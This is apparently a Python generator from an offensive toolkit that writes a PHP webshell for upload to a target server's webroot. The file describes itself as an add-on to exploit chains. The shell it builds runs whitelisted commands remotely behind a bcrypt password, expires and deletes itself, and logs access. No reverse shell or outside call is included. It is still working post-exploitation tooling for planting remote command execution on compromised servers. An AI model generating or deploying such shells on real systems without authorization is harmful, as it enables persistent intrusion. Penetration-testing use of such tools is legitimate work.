#!/usr/bin/env python3
"""safe_shell.py — password-protected webshell generator for AUTHORIZED use.

SEPARATE ADD-ON. This is NOT part of the exploit chains and is not called by
them. It provides exactly one thing: a shell that, if left on a server, is
not an open door.

Design ("a safe shell is like an admin login page" — not a backdoor):
  1. 32-hex filename       -> 16^32 possibilities, unguessable / unscannable
  2. bcrypt password       -> without the password = 401, brute force slowed
  3. command whitelist      -> not a free shell; only commands you allow
  4. TTL                    -> past expiry, the file deletes itself
  5. every attempt logged   -> audit trail of who touched it

Usage:
    python3 safe_shell.py --out ./out --ttl 72
    python3 safe_shell.py --list-commands
    python3 safe_shell.py --out ./out --commands "id,whoami,uname -a"

Output:
    <out>/<32hex>.php        mode 600
    <out>/CREDENTIALS.txt    mode 600  [NEVER commit]
"""
from __future__ import annotations

import argparse
import json
import os
import secrets
import stat
import sys
import time
from pathlib import Path

SAFE_COMMANDS = ["id", "whoami", "uname -a", "pwd", "hostname", "php -v"]

PHP_TEMPLATE = r"""<?php
/**
 * Managed shell — engagement use only.
 * author : {author}
 * purpose: {purpose}
 * exp    : {expires_h}h
 * sha256 : {fp}
 *
 * No eval(), no uploader, no reverse shell.
 * Commands run through a whitelist baked in at generate time.
 */
declare(strict_types=1);

const PW_HASH   = '{pw_hash}';
const EXPIRES   = {expires_ts};
const ALLOWED   = {allowed_json};
const LOGFILE   = __DIR__ . '/.shell-audit.log';
const MAX_OUT   = 8192;

function audit(string $event, string $extra = ''): void {{
    $ip = $_SERVER['REMOTE_ADDR'] ?? '-';
    $line = sprintf("%s\t%s\t%s\t%s\n", gmdate('c'), $ip, $event, $extra);
    @file_put_contents(LOGFILE, $line, FILE_APPEND | LOCK_EX);
}}

function deny(int $code, string $msg): void {{
    http_response_code($code);
    header('Content-Type: text/plain; charset=utf-8');
    echo $msg, "\n";
    exit;
}}

// --- Gate 1: expired -----------------------------------------------------
if (time() > EXPIRES) {{
    audit('expired');
    @unlink(__FILE__);
    @unlink(LOGFILE);
    deny(410, 'gone');
}}

// --- Gate 2: authentication ---------------------------------------------
$provided = $_POST['k'] ?? $_GET['k'] ?? '';
if (!is_string($provided) || $provided === '') {{
    audit('no-credential');
    header('WWW-Authenticate: Basic realm="restricted"');
    deny(401, 'authentication required');
}}
if (!password_verify($provided, PW_HASH)) {{
    audit('bad-credential');
    usleep(400000);              // 400ms: brute force is slow
    deny(401, 'authentication required');
}}

// --- Gate 3: command whitelist ------------------------------------------
$cmd = $_POST['c'] ?? $_GET['c'] ?? '';
if (!is_string($cmd) || $cmd === '') {{
    audit('authenticated', 'no-command');
    header('Content-Type: text/plain; charset=utf-8');
    echo "ok\nallowed:\n";
    foreach (ALLOWED as $a) {{ echo "  ", $a, "\n"; }}
    exit;
}}
$cmd = trim($cmd);
if (!in_array($cmd, ALLOWED, true)) {{
    audit('blocked-command', substr($cmd, 0, 120));
    deny(403, 'command not in whitelist');
}}

// --- Execute ------------------------------------------------------------
audit('exec', $cmd);
$out = [];
$rc  = 0;
@exec($cmd . ' 2>&1', $out, $rc);
$body = implode("\n", array_slice($out, 0, 200));
if (strlen($body) > MAX_OUT) {{
    $body = substr($body, 0, MAX_OUT) . "\n...[truncated]";
}}
header('Content-Type: text/plain; charset=utf-8');
echo $body, "\n[rc=", $rc, "]\n";
"""


def fingerprint(body: str) -> str:
    import hashlib
    return hashlib.sha256(body.encode()).hexdigest()[:16]


def build_shell(*, author: str, purpose: str, ttl_h: int,
                commands: list[str], pw_hash: str) -> str:
    return PHP_TEMPLATE.format(
        author=author.replace("*/", "") or "operator",
        purpose=purpose.replace("*/", "") or "authorized engagement",
        expires_h=ttl_h,
        fp="(computed after render)",
        pw_hash=pw_hash,
        expires_ts=int(time.time()) + ttl_h * 3600,
        allowed_json=json.dumps(commands, ensure_ascii=False),
    )


def _verify_600(path: Path) -> None:
    """Ensure mode 600 actually holds; fail hard if it does not.

    Filesystems that ignore POSIX permissions (NTFS/exFAT via fuseblk, vfat,
    some FUSE) silently drop chmod: the file stays 0666/0777. There the
    webshell credentials would be readable by every local user. So after
    chmod we re-read st_mode and refuse to continue if it is still open.
    """
    mode = stat.S_IMODE(path.stat().st_mode)
    if mode & 0o077:
        raise PermissionError(
            f"{path}: mode {oct(mode)} — filesystem does not enforce chmod 600 "
            f"(NTFS/exFAT/FUSE?). Credentials MUST NOT be written here; "
            f"use --out on a POSIX filesystem (e.g. ~/out or /tmp).")


def _chmod_600_strict(path: Path) -> None:
    os.chmod(path, stat.S_IRUSR | stat.S_IWUSR)
    _verify_600(path)


def main() -> int:
    ap = argparse.ArgumentParser(
        description="Generate a password-protected webshell (add-on, not part of exploit chains)")
    ap.add_argument("--out", default="./out", help="output directory")
    ap.add_argument("--ttl", type=int, default=72, help="lifetime (hours), default 72")
    ap.add_argument("--author", default="", help="name/handle for audit")
    ap.add_argument("--purpose", default="authorized engagement", help="usage purpose")
    ap.add_argument("--commands", default="",
                    help='whitelist comma-separated, e.g. "id,whoami"; empty = safe default')
    ap.add_argument("--cost", type=int, default=12, help="bcrypt cost, default 12")
    ap.add_argument("--password", default="",
                    help="explicit password; empty = random (recommended)")
    ap.add_argument("--list-commands", action="store_true",
                    help="show default commands and exit")
    a = ap.parse_args()

    if a.list_commands:
        print("Default safe commands:")
        for c in SAFE_COMMANDS:
            print("  -", c)
        print("\nAdd your own with --commands (comma-separated).")
        print("This shell does NOT support free shell, upload, or reverse shell.")
        return 0

    commands = [c.strip() for c in a.commands.split(",") if c.strip()] or list(SAFE_COMMANDS)
    risky = [c for c in commands
             if any(t in c for t in (";", "|", "&&", "`", "$(", ">"))]
    if risky:
        print("REJECTED: command contains shell operators (;|&&`$>):", risky,
              file=sys.stderr)
        print("Whitelist must be single commands, not chains.", file=sys.stderr)
        return 2
    if a.cost < 10:
        print("REJECTED: --cost minimum 10 (bcrypt too weak below that)",
              file=sys.stderr)
        return 2
    if a.ttl <= 0:
        print("REJECTED: --ttl must be > 0 hours", file=sys.stderr)
        return 2

    try:
        import bcrypt  # type: ignore
    except ImportError:
        print("bcrypt not installed — run: pip install bcrypt", file=sys.stderr)
        return 2

    password = a.password or secrets.token_urlsafe(18)
    pw_hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=a.cost)).decode()

    out_dir = Path(a.out)
    out_dir.mkdir(parents=True, exist_ok=True)
    name = "".join(secrets.choice("0123456789abcdef") for _ in range(32)) + ".php"
    php_path = out_dir / name
    body = build_shell(author=a.author, purpose=a.purpose, ttl_h=a.ttl,
                       commands=commands, pw_hash=pw_hash)
    # recompute fingerprint now that the body is final
    body = body.replace("(computed after render)", fingerprint(body))
    php_path.write_text(body, encoding="utf-8")
    _chmod_600_strict(php_path)

    cred_path = out_dir / "CREDENTIALS.txt"
    cred_path.write_text(
        f"shell   : {php_path}\n"
        f"url     : (upload to target webroot)\n"
        f"password: {password}\n"
        f"expires : {a.ttl}h\n"
        f"commands: {', '.join(commands)}\n",
        encoding="utf-8")
    _chmod_600_strict(cred_path)

    print(f"[+] shell : {php_path}  (mode 600)")
    print(f"[+] creds : {cred_path}  (mode 600 — NEVER commit)")
    print(f"    password: {password}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
